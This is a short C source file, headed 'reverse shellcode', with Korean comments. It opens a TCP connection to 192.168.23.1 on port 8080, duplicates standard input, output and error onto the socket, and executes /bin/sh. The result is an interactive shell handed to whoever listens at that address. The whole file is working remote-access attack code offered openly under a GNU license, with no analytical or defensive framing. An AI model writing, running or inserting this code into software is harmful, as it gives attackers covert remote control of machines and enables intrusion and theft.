/*
 * Author : superdk@hanmail.net
 * DATA : reverse shellcode
 * LICENSE : GNU License
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char **argv)
{
	struct sockaddr_in serveraddr;
	int server_sockfd;
	int client_len;
	char buf[80];
	char rbuf[80];
	char *cmdBuf[2] = {"/bin/sh", (char *)0};
	
	// 소켓 설정
	server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_addr.s_addr = inet_addr("192.168.23.1"); // 접속받을 클라이언트의 IP
	serveraddr.sin_port = htons(atoi("8080")); // 접속받을 포트
	client_len = sizeof(serveraddr);
	
	connect(server_sockfd, (struct sockaddr *)&serveraddr, client_len);
	
	dup2(server_sockfd, 0); // 표준입력 복사
	dup2(server_sockfd, 1); // 표준출력 복사
	dup2(server_sockfd, 2); // 표준에러 복사
	
	execve("/bin/sh", cmdBuf, 0); // 배시셸 실행
}